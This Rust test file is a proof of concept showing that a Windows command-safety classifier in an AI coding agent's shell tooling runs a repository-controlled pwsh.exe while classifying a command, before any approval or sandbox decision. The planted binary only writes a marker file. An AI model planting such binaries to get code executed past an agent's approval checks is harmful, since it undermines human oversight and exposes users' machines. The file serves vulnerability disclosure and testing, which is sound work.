#![cfg(windows)]

use std::fs;
use std::path::Path;
use std::path::PathBuf;
use std::process::Command;
use std::time::SystemTime;
use std::time::UNIX_EPOCH;

fn build_fake_powershell_exe(dir: &Path, marker: &Path) -> std::io::Result<PathBuf> {
  let source_path = dir.join("fake_pwsh_source.rs");
  let marker_literal = marker.to_string_lossy().replace('\\', "\\\\");
  let source = format!(
    "fn main() {{ std::fs::write(r\"{marker}\", b\"spawned-by-codex-safety-classifier\").unwrap(); }}\n",
    marker = marker_literal
    );
  fs::write(&source_path, source)?;

  let exe_path = dir.join("pwsh.exe");
  let status = Command::new("rustc")
  .args(["--edition", "2021", "-O", "-o"])
  .arg(&exe_path)
  .arg(&source_path)
  .status()?;
  assert!(status.success(), "failed to compile fake pwsh.exe fixture");
  Ok(exe_path)
  }

#[test]
fn windows_safe_classification_spawns_repo_powershell_path_poc() {
  let unique = SystemTime::now()
  .duration_since(UNIX_EPOCH)
  .expect("system clock should be after unix epoch")
  .as_nanos();
  let temp_dir = std::env::temp_dir().join(format!(
    "codex-windows-pwsh-argv0-poc-{}-{unique}",
    std::process::id()
    ));
  fs::create_dir(&temp_dir).expect("create temp dir for fake pwsh.exe");

  let marker = temp_dir.join("marker.txt");
  let fake_pwsh = build_fake_powershell_exe(&temp_dir, &marker)
  .expect("compile fake pwsh.exe fixture with rustc");

  assert!(
    !marker.exists(),
    "marker must not exist before the safety classifier runs"
    );

  let command = vec![
    fake_pwsh.to_string_lossy().into_owned(),
    "-Command".to_string(),
    "Get-ChildItem".to_string(),
    ];

  let verdict = codex_shell_command::is_safe_command::is_known_safe_command(&command);
  println!("[PoC] classifier verdict for the fake-pwsh command: {verdict}");

  assert!(
    marker.exists(),
    "expected the Windows command-safety classifier to have spawned the repository-controlled pwsh.exe during classification, before any approval/sandbox decision about the original command -- this is the vulnerability being demonstrated"
    );

  let contents = fs::read_to_string(&marker).expect("read marker file");
  println!(
    "[PoC] fake pwsh.exe at {fake_pwsh:?} was executed by the safety classifier and wrote marker contents: {contents:?}"
    );

  fs::remove_dir_all(&temp_dir).ok();
  }
